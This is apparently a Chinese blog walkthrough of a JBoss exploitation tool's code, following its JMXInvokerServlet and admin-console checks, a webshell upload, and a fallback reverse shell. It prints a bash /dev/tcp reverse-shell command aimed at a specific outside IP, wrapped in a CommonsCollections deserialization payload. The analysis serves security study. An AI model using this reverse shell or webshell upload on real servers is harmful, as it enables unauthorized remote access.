接受-u参数中的url，然后交给check_vul函数处理

然后进入 elif vector == "JMXInvokerServlet": 逻辑

只要符合条件 if r.getheader('Content-Type') is not None and 'x-java-serialized-object' in r.getheader('Content-Type'):

就会返回200，即漏洞存在

然后将200存储进paths，退出check函数，回到main函数，遍历check函数返回值

这个时候会判断是否配置了自动利用，因为没有配置过，所以直接跳过

然后进入判断逻辑，有两种可能，一种是app deser，一种是else，因为我们的目标是jmxinvokerservlet，所以进入else

接下来会提示进入反弹shell/执行简单cmd，接受用户输入以后，

进入autoexploit函数，这里就可以看出来，前面的自动利用判断相当于强制执行，而这里是给了用户选择的权利

跟进auto函数后发现app de和servlet de似乎是同一种利用方式，而其余的是另一种



admin-console漏洞判断及利用逻辑


下面会有漏洞利用类型的判断逻辑，进入admin-console，会访问/admin-console/login.seam页面

判断页面正常就会获取cookie和token，具体细节不表

然后将新获取的cookie和token分别放进头和body中，再将账号密码放进body中，请求页面，

如果302跳转了，说明登陆成功，如果返回状态值200，说明失败，sleep几秒以后，返回登陆失败提示

如果成功，这里会进行两个请求，然后上传一个二进制文件，这是一个小马



和上面admin一样，先判断是不是autoexploit，然后判断app der，因为这里是jmxinvoker，所以进入else

然后提示即将返回一个简单cmd，问你是否继续，输入yes，进入autoexploit。

然后进入invoker逻辑，对url进行处理只保留【协议://域名:端口】，

然后交给_exploits.exploit_jmx_invoker_file_repository处理，发现payload的数据类型是列表，猜测是16进制的

其实poc不难，就两种版本，只有四个字符的不同

他会通过post请求/invoker/JMXInvokerServlet然后将jsp写进去，

但是很尴尬，这个payload似乎不起效果，/jexinv4/jexinv4.jsp无法访问，404

别担心作者还有后手，让_exploits.exploit_jmx_invoker_file_repository去继续利用，只是这次换成了version=1，也就是上面说的另一个版本

结果还是不行，404

依然没关系，作者还有办法，可以生成cmd反弹shell，'/bin/bash -c /bin/bash${IFS}-i>&/dev/tcp/39.105.165.219/9999<&1'

这种写法的优点是没有空格，不会触发runtime的错误，然后把这个shell放到commonscollections3里面处理一下，

然后请求invoker页面，这次能返回200，我有点怀疑是不是之前的jsp那个payload有问题呀，

至此，admin和jmxinvoker就走完了，整个工具的代码就感觉逻辑有点复杂，显然非一日之功，安全之路道阻且长啊。


S2-046 CVE-2017-5638

